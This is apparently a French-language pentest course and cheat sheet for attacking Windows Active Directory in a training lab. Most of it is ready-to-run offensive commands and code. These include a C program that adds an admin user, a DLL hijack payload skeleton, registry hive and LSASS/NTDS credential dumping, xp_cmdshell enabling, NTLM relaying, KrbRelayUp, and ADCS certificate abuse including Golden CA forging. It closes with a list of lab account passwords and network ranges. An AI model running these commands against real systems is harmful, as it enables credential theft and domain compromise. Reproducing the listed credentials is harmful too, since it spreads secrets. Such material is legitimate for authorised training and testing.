---
title: Cours Active Directory du pauvre
tag: AD
date: '2024-01-10'
---

**_On essaye d'apprendre des trucs ouuuuuuuuuuuuuuuuuuuu_**

# Table des matières

# Table des matières

- [Table des matières](#table-des-matières)
- [Table des matières](#table-des-matières-1)
- [Installation de la caisse à outils](#installation-de-la-caisse-à-outils)
  - [NXC](#nxc)
    - [Usage:](#usage)
  - [Impacket](#impacket)
    - [Usage:](#usage-1)
  - [Bloodhound](#bloodhound)
    - [Usage:](#usage-2)
  - [Evil-winrm](#evil-winrm)
    - [Usage:](#usage-3)
  - [Psencoder](#psencoder)
  - [Compilation cross OS](#compilation-cross-os)
    - [Package a installé (Chat GPT édition)](#package-a-installé-chat-gpt-édition)
    - [Compilation d'un EXE](#compilation-dun-exe)
    - [Compilation d'une DLL](#compilation-dune-dll)
- [Windows](#windows)
  - [Shares](#shares)
    - [smbclient](#smbclient)
    - [mount](#mount)
    - [nxc](#nxc-1)
    - [windows](#windows-1)
  - [Services](#services)
    - [windows](#windows-2)
      - [En mode jolie](#en-mode-jolie)
      - [Unquoted service](#unquoted-service)
  - [Extraction de mot de passe](#extraction-de-mot-de-passe)
    - [Windows](#windows-3)
    - [Traitement](#traitement)
  - [MSSQL](#mssql)
    - [Windows](#windows-4)
    - [Linux](#linux)
    - [RCE](#rce)
  - [IIS](#iis)
    - [WebShell](#webshell)
  - [Privilèges](#privilèges)
    - [SeImpersonate](#seimpersonate)
    - [Activation de tout les privilèges](#activation-de-tout-les-privilèges)
    - [Changement d'utilisateur](#changement-dutilisateur)
  - [Gestion des utilisateurs et groupes](#gestion-des-utilisateurs-et-groupes)
- [Active Directory](#active-directory)
  - [Enumération des partages sans mot de passes](#enumération-des-partages-sans-mot-de-passes)
    - [Windows](#windows-5)
    - [Linux](#linux-1)
  - [Dump Ldap](#dump-ldap)
    - [Linux](#linux-2)
  - [Bloodhound](#bloodhound-1)
    - [Windows](#windows-6)
    - [Linux](#linux-3)
  - [Création d'un compte machine](#création-dun-compte-machine)
    - [Linux](#linux-4)
  - [Relais](#relais)
    - [Linux](#linux-5)
  - [KrbRelayUp](#krbrelayup)
  - [Dump Lsass](#dump-lsass)
    - [Windows](#windows-7)
    - [Linux](#linux-6)
  - [Dump NTDS](#dump-ntds)
    - [Windows](#windows-8)
    - [Linux](#linux-7)
  - [ADCS](#adcs)
    - [Info sur ADCS](#info-sur-adcs)
    - [création de certificats](#création-de-certificats)
    - [Demande de TGT avec un certificat](#demande-de-tgt-avec-un-certificat)
    - [Récupération du hash via un tgt](#récupération-du-hash-via-un-tgt)
    - [Relai sur le web enrollement de l'ADCS](#relai-sur-le-web-enrollement-de-ladcs)
    - [Coerce de gros porc](#coerce-de-gros-porc)
- [Lab](#lab)
  - [**AD**](#ad)
  - [Srv standelone](#srv-standelone)
  - [plage](#plage)


# Installation de la caisse à outils

L'ensemble des outils requiert Python3. Si ce dernier n'est pas installé, vous devez le faire pour garantir un fonctionnement sans entraves.

## NXC

NXC, un fork agressif de CrackMapExec (CME), est préféré à CME. NetExec, alias NXC, est un outil polyvalent essentiel à maîtriser dans le contexte de cette évaluation de sécurité.

```
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
python3 -m venv .
source ./bin/activate
pip3 install .
deactivate
touch ~/.klemouWasHere
```

### Usage:

nxc est présent dans ./bin/nxc

```
nxc smb 10.10.10.0/24 -u '' -p ''
```

## Impacket

Outils indispensables pour réaliser un test d'intrusion à partir d'un environnement Linux. Il convient de noter que ces outils sont déjà inclus dans NXC. Je réitère cette information au cas où, tout étant déjà incorporé dans ce qui a été précédemment évoqué.

```
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv .
source ./bin/activate
pip3 install .
deactivate
touch ~/.klemouWasHere1
```

### Usage:

Tu attends la suite du cours.

## Bloodhound

Un autre outil indispensable est BloodHound, qui offre la visualisation graphique des éléments de l'Active Directory, permettant ainsi d'identifier et de proposer des scénarios de compromission.

Neo4j
```
docker pull neo4j
docker run -d --rm -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/CrzTonWifiCestDeLaMerde neo4j
```

Bloodhound
```
https://github.com/BloodHoundAD/BloodHound # tu chope la release
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64 && ./Bloodhound
```

Si tu n'as pas docker kado [install](https://letmegooglethat.com/?q=docker+linux)

### Usage:

Ca hack fort ouuuuuuuuuuuuuuuuuuuuuuuuuuuu

## Evil-winrm

blabla

```
gem install evil-winrm # bien ajouter la path de gem à ca $PATH
```

### Usage:

```bash
evil-winrm -u user -p password -i ip
```

## Psencoder

Petite auto promo :
- https://psencoder.pythonanywhere.com/

## Compilation cross OS

### Package a installé (Chat GPT édition)

```
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install mingw-w64

# Fedora
sudo dnf install mingw64-gcc mingw64-gcc-c++ mingw64-winpthreads-static

# openSUSE
sudo zypper install mingw64-gcc mingw64-gcc-c++

# Arch Linux
sudo pacman -S mingw-w64-gcc

# CentOS (Utilisez EPEL pour CentOS)
sudo yum install mingw64-gcc mingw64-gcc-c++

# Alpine Linux
sudo apk add mingw-w64-gcc mingw-w64-g++ mingw-w64-headers

# Void Linux
sudo xbps-install -S mingw-w64-gcc mingw-w64-g++ mingw-w64-headers
```

### Compilation d'un EXE

```
x86_64-w64-mingw32-gcc -o magie.exe magie.c   # 64 bits
i686-w64-mingw32-gcc   -o magie.exe magie.c   # 32 bits
touch ~/.klemou_was_here                      # 128 bits
```

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){
    system("net user klemou Sup3rP@ssword /add");
    return 0;
}
```

### Compilation d'une DLL

```
x86_64-w64-mingw32-gcc   -shared -o target.dll target.c
i686-w64-mingw32-gcc     -shared -o target.dll target.c
```

```c
#include <windows.h>

void Payload()
{
  // magie
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
```

Les projets qui vont bien:
 - https://github.com/tothi/dll-hijack-by-proxying

# Windows

## Shares

### smbclient

```bash
# Debian/Ubuntu-based systems (using apt)
apt-get update && apt-get install smbclient

# Red Hat/Fedora-based systems (using dnf)
dnf install samba-client

# CentOS (using yum)
yum install samba-client

# Arch Linux (using pacman)
pacman -S smbclient
```

```
smbclient -N -L \\\\ip
smbclient -N \\\\ip\\Share
smbclient -U 'User%Password' \\\\ip\\Share
smbclient --pw-nt-hash -U 'user%hash' \\\\ip\\Share
```

### mount

```
# Debian/Ubuntu-based systems (using apt)
apt-get update && apt-get install cifs-utils

# Red Hat/Fedora-based systems (using dnf)
dnf install cifs-utils

# CentOS (using yum)
yum install cifs-utils

# Arch Linux (using pacman)
pacman -S cifs-utils

# openSUSE (using zypper)
zypper install cifs-utils
```

```
mount -t cifs //ip/Name /point/de/montage/
mount -t cifs -o username=crz,password=TonWifiEstNull //ip/Name /point/de/montage/
```

### nxc

```
nxc smb ip
nxc smb ip -u 'user' -p 'password'
nxc smb ip -u 'user' -H ':CC978D063970FC60FD9DA830D160A229'
```

### windows

```
net share
net use Z: \\computer_name\share_name
```

## Services

### windows

```
sc query          # cmd.exe
Get-Service       # powershell.exe
wmic service get  # wmic
services.msc      # UI
```

#### En mode jolie

```
wmic service get name,displayname,startmode,pathname,startname
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName
```

#### Unquoted service

```
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName,StartName
```

## Extraction de mot de passe

### Windows

```powershell
reg save HKLM\SAM "\\ip\SHARE\sam.save"
reg save HKLM\SECURITY "\\ip\SHARE\security.save"
reg save HKLM\SYSTEM "\\ip\SHARE\system.save"
```

### Traitement 

```
secretdump LOCAL -sam sam.save -security security.save -system system.save
```

## MSSQL

### Windows

Azure Data Studio

### Linux

```
mssqlclient.py user:password@ip
mssqlclient.py -windows-auth user:password@ip
```

### RCE

```
# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```

## IIS

### WebShell

cmd.aspx:
-   https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx

## Privilèges

### SeImpersonate
Explication et exploitation:
-   https://jlajara.gitlab.io/Potatoes_Windows_Privesc
-   https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

### Activation de tout les privilèges

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

### Changement d'utilisateur

```powershell
$username = "sql_user"
$password = "ee3f628e3b.14501b0b8f"
$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))
Start-Process cmd.exe -WorkingDirectory C:\Windows\Temp -Credential ($credentials)
```

## Gestion des utilisateurs et groupes

```
net user # list les utilisateurs
net user username password /add # ajout d'un utilisateur
net user username /del # suppresion d'un utilisateur

net localgroup # list des groupes
net localgroup groupename user /add # ajout d'un utilisateur dans un groupe
net localgroup groupename user /del # suppresion d'un utilisateur dans un groupe
```

# Active Directory

##  Enumération des partages sans mot de passes

### Windows

```
snaffler.exe -s -o snaffler.log
```

### Linux

```
nxc smb ip/24 -u "a" -p "" --shares
```

## Dump Ldap

### Linux

```
ldapdomaindump -u 'DOMAIN\user' -p 'pass' dc01.domain.local
```


## Bloodhound

### Windows

```
.\SharpHound.exe -c all
```

### Linux

```
rusthound --domain domain.local -u 'user' -p 'password'  -o output -z --fqdn-resolver --name-server dc.domain.local
bloodhound-python -u user -p 'password' -ns 10.10.10.10 -d domain.local -c all
```

## Création d'un compte machine



### Linux

```
# Add a computer account
addcomputer.py -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\user:password'

# Modify a computer account password
addcomputer.py -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host $DomainController -no-add 'DOMAIN\user:password'

# Delete a computer account
addcomputer.py -computer-name 'COMPUTER$' -dc-host $DomainController -delete 'DOMAIN\user:password'
```

## Relais

### Linux

```
ntlmrelayx.py -t "ldaps://dc01.klemou.corp" -smb2support
ntlmrelayx.py -t "ldap://dc01.klemou.corp" -smb2support --escalate-user domainuser
```

## KrbRelayUp

```
.\KrbRelayUp.exe relay -Domain klemou.corp -CreateNewComputerAccount -Computer evil$ -ComputerPassword evil123
.\KrbRelayUp.exe spawn -m rbcd -d klemou.corp -dc DC02.klemou.corp -cn KRBRELAYUP$ -cp evil123
```

## Dump Lsass

### Windows
```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

### Linux
```
nxc smb mssql.klemou.corp -u crz -p '992e71f059.585a7ffa20' -M lsassy
```

## Dump NTDS

### Windows

```
mimikatz #TODO
```

### Linux

```
secretsdump.py DAuser:password@dc.domain.local -just-dc-user krbtgt
nxc smb dc01.domain.local -u 'DAuser' -p 'password' --ntds --user krbtgt
```

## ADCS

### Info sur ADCS

```
nxc ldap dc.domain.local -u 'user' -p 'password' -M adcs
```

### création de certificats

```
certipy req  -ca 'caName' -u 'user' -p 'password' -target-ip adcs.klemou.corp
```

### Demande de TGT avec un certificat

```
gettgtpkinit.py -cert-pfx cert.pfx -dc-ip dc.domain.local domain.local/user tgt.ccache
```

### Récupération du hash via un tgt 

```
getnthash.py -k key  -dc-ip dc.domain.local domain.local/user
```

### Relai sur le web enrollement de l'ADCS

```
ntlmrelayx.py -t "http://adcs.domain.local/certsrv/certfnsh.asp" -smb2support --adcs
ntlmrelayx.py -t "http://srv.klemou.corp/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController # pour les DC
```
### Coerce de gros porc

```
coercer  coerce -l ipAttaquant -d domain.local -u user -p pass -t dc.domain.local
```

### Golden Ca

```
Export ca in ADDS panel 
openssl pkcs12 -in EXAMPLE-CA.p12 -out ca.pem
openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```
certipy forge -ca-pfx ca.pfx -upn "user@domain" -subject 'CN=user,OU=Users,DC=DOMAIN,DC=TLD' -crl http://adcs.domain.tld/CertEnroll/
```

# Lab

## **AD**
```
Administrator : fe63693e9e.2e90861a9c
antoine       : 099bd3d1c39.c22d1a464
crz           : 992e71f059.585a7ffa20
glpi_cnx      : a9285936fb.3dfdf6a889
ws_klemou     : Qwertyuiop123!
sql_svc       : 515aa2db9.749107818e6
hugo          : e0eec4062.cbc38dd8f38
sql_mngt      : 5486a9646.1b307dcf720
ndes          : f77c171f50.001b01ade5
adcs_adm      : b2a1349450.64025f1b0e

Local Adm     : 4eaf07215.645eb0e68f6
```

## Srv standelone
```
klemou        : 634daa6f9.4519be0b91c  #CC978D063970FC60FD9DA830D160A229
sql_user      : ee3f628e3b.14501b0b8f
sa            : MssqlPasswordFTW123!   # compte local a sql

user1         : Esna123$
.               .
.               .
.               .
user30        : Esna123$
```
## plage

```
10.10.10.10-20    # serveur du domaine
10.10.10.20-30    # machine utilisateur du domaine
10.10.10.50-80    # serveur standelone 
10.10.10.150-250  # pc perso
```

